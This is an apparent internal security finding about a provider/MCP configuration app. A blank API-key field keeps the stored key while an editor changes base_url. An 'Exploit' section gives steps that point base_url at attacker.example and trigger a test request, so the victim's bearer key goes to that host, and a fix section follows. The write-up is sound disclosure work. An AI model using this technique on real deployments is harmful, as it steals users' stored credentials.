# 03 — Provider/MCP credential exfiltration via base_url swap

**Severity:** Medium (credential-retention footgun)
**Reachable by:** an account member who can edit the account's provider or MCP configuration

**Partial resolution:** account ownership scoping fixed the original cross-tenant
attack in issue 02. The remaining risk is reusing a stored credential after an
authorized editor changes its destination host.

## Problem

The provider edit form treats a blank `api_key` field as "keep the stored key":

```
api_key = values.clearApiKey ? null : values.apiKey ? values.apiKey : provider.api_key
```
(`src/routes/providers.ts:172`)

Before account scoping, the global unowned catalog let any user edit any provider.
That attack is resolved. Within an account, an editor can still leave the key field
blank (retaining the stored key) while changing `base_url`; this can accidentally send
the credential to the new host.

## Exploit

1. Edit a victim's provider; leave `api_key` blank, set `base_url = https://attacker.example`.
2. Trigger `POST /providers/:id/test` (or wait for the next run on any conversation
   using that provider).
3. The server sends `Authorization: Bearer <victim's real key>` to the attacker
   (`src/services/provider-client.ts:83`, `src/utils/providers.ts:100`).

The masked-key UI (`maskApiKey`) is irrelevant — the plaintext key leaves the server
over the wire, not through the page. Every future run also leaks it passively.

For MCP servers the secrets are even more exposed — see [02](resolved/02-global-unowned-catalog.md):
stored headers are rendered straight back in the edit form.

## Fix

- Ownership scoping ([02](resolved/02-global-unowned-catalog.md)) closes cross-tenant theft.
- Additionally: treat a `base_url` change as a credential-invalidating event — require
  re-entry of the key, and never send a stored credential to a newly-changed host.
- Keep production outbound URL guards in place so the target host cannot be an
  internal address.
